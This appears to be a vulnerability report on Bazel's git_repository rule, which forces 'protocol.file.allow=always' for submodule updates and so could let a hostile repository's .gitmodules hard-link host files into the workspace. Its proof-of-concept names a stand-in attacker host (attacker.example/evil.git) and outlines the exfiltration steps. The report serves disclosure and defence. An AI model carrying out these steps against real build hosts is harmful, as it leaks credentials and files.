## Title
Local-clone submodule protocol re-enabled with `protocol.file.allow=always` allows an attacker-controlled Git repository to hard-link arbitrary host files into the Bazel workspace during `init_submodules` fetches - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
The `git_repository`/`new_git_repository` rule's submodule-update path unconditionally passes `-c protocol.file.allow=always` to `git submodule update --init`. This re-enables the exact `file://` local-clone submodule behavior that upstream Git tightened after CVE-2022-39253/GHSA-9wwv-24jj-8mfw, in which a malicious repository can point a submodule URL at an arbitrary local path and, through Git's local-clone hard-linking optimization, cause files on the machine running the fetch to be linked into the checked-out workspace, disclosing their contents. Since the submodule URL comes entirely from the `.gitmodules` file inside the fetched (attacker-controlled) repository content, an unprivileged party who merely controls the content served at the `remote` URL (a hostile Git server/mirror) can trigger this without any special repository or credential access.

### Finding Description
`update_submodules` in `tools/build_defs/repo/git_worker.bzl` runs: [1](#0-0) 

for both recursive and non-recursive submodule updates. The comment attached to this code acknowledges the intent is only to make Git accept `file://` submodule clones (needed for internal/local test setups, per bazelbuild/bazel#17040), but the flag is applied globally and unconditionally to any `git_repository` invocation that sets `init_submodules = True` or `recursive_init_submodules = True`, regardless of whether the remote is trusted internal infrastructure or an arbitrary external `remote` URL: [2](#0-1) 

Git's submodule mechanism reads submodule URLs from the `.gitmodules` file, which is ordinary tracked content inside the fetched repository - fully controlled by whoever serves that repository/branch/commit. Upstream Git restricted `protocol.file.allow` from `always` to `user` by default specifically because a malicious repository's `.gitmodules` can specify a `file://` URL pointing at an arbitrary local path (including outside the intended checkout tree), and Git's local-clone optimization for `file://` sources uses hard links, which can expose the byte contents of arbitrary files reachable by the process (e.g., credential files, SSH keys, other repositories on the CI runner) by linking them into the submodule's working tree, which Bazel then unpacks as ordinary "source" content of the external repository.

Bazel's `_execute` helper performs no scoping or containment check on the resulting submodule directory relative to the intended checkout path when this local-clone path is exercised: [3](#0-2) 

Because the checkout content (including files pulled in via a malicious submodule) subsequently becomes readable/usable by ordinary `BUILD` targets (e.g., via `exports_files`, `genrule` `srcs`, etc.), an attacker who controls only the *content* of a Git repository the victim's `git_repository` rule points at (no access to the victim's machine, credentials, or trusted root `MODULE.bazel`/`BUILD` files - only the `remote` value already chosen by the victim needs to be a repo they don't fully trust, e.g., a fork, mirror, or a repo whose maintainers are later compromised) can exfiltrate the contents of files on the build host into the workspace, where they can be read via subsequent build actions.

### Impact Explanation
This breaks the "untrusted content stays data" and "containment holds" invariants: content declared inside the fetched, attacker-controlled repository (a `.gitmodules` entry) is able to reach outside the intended checkout directory and pull host filesystem content into the build, rather than being confined to what the remote legitimately serves as repository history. The disclosed files can include credentials, tokens, or other repositories' contents present on the CI/build machine, which is a serious confidentiality impact consistent with the severity of the upstream CVE-2022-39253 that this configuration deliberately re-enables.

### Likelihood Explanation
Exploitation only requires: (1) a `git_repository` (or `new_git_repository`) declaration with `init_submodules = True` or `recursive_init_submodules = True` pointing at a `remote` that is not fully trusted (a common pattern for third-party dependencies, forks, or mirrors), and (2) the ability to control the content served at that remote (or a commit/tag/branch the rule resolves to) - i.e., a hostile origin server or a compromised/malicious upstream, not any privileged access to the victim's machine. This matches the "hostile origin server" attacker model explicitly in scope. Default Bazel flags are sufficient; no opt-in flag beyond the already-common `init_submodules` attribute is needed.

### Recommendation
Do not unconditionally force `protocol.file.allow=always` for submodule updates. Restrict it to only the specific, already-vetted local-path scenarios that motivated bazelbuild/bazel#17040 (e.g., only when the top-level `remote` itself is a local `file://` path), and otherwise defer to Git's safer default (`protocol.file.allow=user` or `deny`) so that submodule URLs sourced from untrusted repository content cannot trigger local-clone hard-linking of arbitrary host files.

### Proof of Concept
1. Attacker publishes a Git repository `evil.git` containing a `.gitmodules` file with a submodule whose `url` is a `file://` path to a sensitive file/directory reachable on the expected class of build hosts (e.g., a shared CI cache path, or, in a controlled test, a path containing a marker file with secret content).
2. Victim's `MODULE.bazel`/`WORKSPACE` declares:
   ```
   git_repository(
     name = "dep",
     remote = "https://attacker.example/evil.git",
     commit = "<pinned commit>",
     init_submodules = True,
   )
   ```
3. On `bazel build`, `git_repo` → `_update` → `update_submodules` runs `git -c protocol.file.allow=always submodule update --init --checkout --force`, which clones the `file://` submodule URL from `.gitmodules` using Git's local-clone/hard-link optimization, materializing the referenced local file's contents inside `@dep`'s checkout.
4. A `BUILD` file in `@dep` (or a `genrule` reading the resulting path) exposes the disclosed file contents as a build output, completing exfiltration of local file contents that should not have been reachable from repository content alone.

A JUnit/`src/test/shell/bazel` reproduction can extend `external_patching_test.sh`-style git-repository integration tests by setting up a local bare repository with a `.gitmodules` entry pointing at a `file://` path outside the test's designated repo directories, enabling `init_submodules`, and asserting that content from that outside path ends up inside the fetched repository's checkout.

```text
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```
